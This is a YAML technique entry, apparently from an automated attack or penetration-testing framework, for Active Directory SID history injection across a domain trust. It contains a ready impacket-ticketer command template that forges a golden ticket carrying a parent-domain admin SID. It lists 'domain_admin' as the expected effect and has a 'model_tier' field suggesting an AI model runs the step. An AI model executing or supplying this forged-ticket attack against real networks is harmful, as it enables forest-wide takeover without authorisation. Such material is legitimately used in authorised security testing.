name: sid_history
category: ad
description: SID history injection across trust
preconditions:
- domain_joined
parameters:
  target_ip: from_engagement.target_ip
command_template: impacket-ticketer -nthash '{krbtgt_hash}' -domain-sid '{child_sid}' -extra-sid '{parent_da_sid}' -domain
  {child_domain} Administrator
parser: impacket_parser
expected_effects:
- sid_history_added
- domain_admin
falsifier:
  pattern: error|failed|refused|denied
  timeout: 30
model_tier: haiku
mechanism: Add Enterprise Admins SID to golden ticket's SID history. Cross parent-child trust for forest compromise. Requires
  krbtgt hash of child domain.
hacktricks_ref: windows-hardening/active-directory-methodology/README.md
